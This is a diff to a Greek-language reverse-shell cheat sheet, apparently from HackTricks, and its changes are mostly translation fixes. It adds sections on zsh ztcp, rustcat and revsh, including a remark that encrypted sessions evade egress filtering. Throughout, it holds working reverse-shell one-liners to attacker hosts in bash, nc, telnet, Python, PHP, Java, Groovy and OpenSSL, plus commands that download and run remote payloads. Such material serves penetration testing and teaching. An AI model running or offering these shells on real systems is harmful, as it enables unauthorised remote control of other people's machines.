@@ -2,11 +2,11 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Αν έχετε ερωτήσεις σχετικά με οποιαδήποτε από αυτές τις shells μπορείτε να τις ελέγξετε με** [**https://explainshell.com/**](https://explainshell.com)
+**Αν έχετε ερωτήσεις σχετικά με οποιαδήποτε από αυτές τις θήκες, μπορείτε να τις ελέγξετε με** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
-**Μόλις αποκτήσετε μια reverse shell**[ **διαβάστε αυτή τη σελίδα για να αποκτήσετε ένα πλήρες TTY**](full-ttys.md)**.**
+**Μόλις αποκτήσετε μια αντίστροφη θήκη**[ **διαβάστε αυτή τη σελίδα για να αποκτήσετε ένα πλήρες TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -21,9 +21,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Μην ξεχάσετε να ελέγξετε με άλλες θήκες: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh και bash.
+Μην ξεχάσετε να ελέγξετε με άλλα shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh και bash.
 
-### Συμβολική ασφαλής θήκη
+### Symbol safe shell
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -51,7 +51,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 Ένα προτεινόμενο εργαλείο για αυτό το σκοπό είναι το [toboggan](https://github.com/n3rada/toboggan.git), το οποίο απλοποιεί την αλληλεπίδραση με το περιβάλλον στόχο.
 
-Για να χρησιμοποιήσετε το toboggan αποτελεσματικά, δημιουργήστε ένα Python module προσαρμοσμένο στο RCE πλαίσιο του συστήματος στόχου σας. Για παράδειγμα, ένα module με το όνομα `nix.py` θα μπορούσε να δομηθεί ως εξής:
+Για να χρησιμοποιήσετε το toboggan αποτελεσματικά, δημιουργήστε ένα Python module προσαρμοσμένο στο RCE πλαίσιο του συστήματος στόχου σας. Για παράδειγμα, ένα module με όνομα `nix.py` θα μπορούσε να δομηθεί ως εξής:
 ```python3
 import jwt
 import httpx
@@ -75,7 +75,7 @@ response.raise_for_status()
 
 return response.text
 ```
-Και στη συνέχεια, μπορείτε να εκτελέσετε:
+Και τότε, μπορείτε να εκτελέσετε:
 ```shell
 toboggan -m nix.py -i
 ```
@@ -85,9 +85,9 @@ toboggan -m nix.py -i
 
 Απλά χρειάζεται να τροποποιήσετε:
 
-- Το URL του ευάλωτου host
+- Τη διεύθυνση URL του ευάλωτου host
 - Το πρόθεμα και το επίθημα του payload σας (αν υπάρχει)
-- Τον τρόπο αποστολής του payload (headers; data; extra info?)
+- Τον τρόπο αποστολής του payload (headers; data; επιπλέον πληροφορίες;)
 
 Στη συνέχεια, μπορείτε απλά να **στείλετε εντολές** ή ακόμα και **να χρησιμοποιήσετε την εντολή `upgrade`** για να αποκτήσετε ένα πλήρες PTY (σημειώστε ότι οι σωλήνες διαβάζονται και γράφονται με καθυστέρηση περίπου 1.3 δευτερολέπτων).
 
@@ -105,7 +105,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
-## Τελνέτ
+## Telnet
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -124,7 +124,7 @@ while true; do nc -l <port>; done
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
-## Πύθων
+## Python
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -154,7 +154,7 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
-## Τζάβα
+## Java
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (ενσωματωμένο TCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – σύγχρονος listener παρόμοιος με το netcat γραμμένος σε Rust (συσκευασμένος στο Kali από το 2024).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Χαρακτηριστικά:
+- Προαιρετική σημαία `--ssl` για κρυπτογραφημένη μεταφορά (TLS 1.3)
+- `-s` για να εκκινήσει οποιοδήποτε δυαδικό (π.χ. `/bin/sh`, `python3`) στον θύμα
+- `--up` για αυτόματη αναβάθμιση σε πλήρως διαδραστικό PTY
+
+## revsh (κρυπτογραφημένο & έτοιμο για pivot)
+
+`revsh` είναι ένας μικρός πελάτης/διακομιστής C που παρέχει πλήρες TTY μέσω ενός **κρυπτογραφημένου καναλιού Diffie-Hellman** και μπορεί προαιρετικά να συνδεθεί σε μια **διεύθυνση TUN/TAP** για αναστροφή τύπου VPN.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Χρήσιμες σημαίες:
+- `-b` : bind-shell αντί για reverse
+- `-p socks5://127.0.0.1:9050` : proxy μέσω TOR/HTTP/SOCKS
+- `-t` : δημιουργία διεπαφής TUN (reverse VPN)
+
+Επειδή ολόκληρη η συνεδρία είναι κρυπτογραφημένη και πολυπλεξία, συχνά παρακάμπτει απλό φιλτράρισμα εξόδου που θα σκότωνε μια απλή `/dev/tcp` shell.
+
 ## OpenSSL
 
 Ο Επιτιθέμενος (Kali)
@@ -239,7 +281,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Shell σύνδεσης
+### Bind shell
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
@@ -305,7 +347,7 @@ Xnest :1
 ```
 ## Groovy
 
-από [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ΣΗΜΕΙΩΣΗ: Η αντίστροφη θηλή Java λειτουργεί επίσης για το Groovy
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ΣΗΜΕΙΩΣΗ: Η αντίστροφη θηλή Java λειτουργεί επίσης για το Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
